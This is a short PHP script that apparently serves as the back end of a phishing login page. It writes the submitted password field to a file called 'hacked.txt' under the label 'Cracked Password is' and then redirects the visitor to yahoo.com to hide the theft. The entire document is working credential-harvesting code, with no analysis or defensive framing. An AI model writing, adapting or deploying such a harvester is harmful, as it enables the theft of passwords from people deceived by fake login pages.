<?php

file_put_contents("hacked.txt", " [Cracked Password is➡️:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: https://www.yahoo.com');
?>
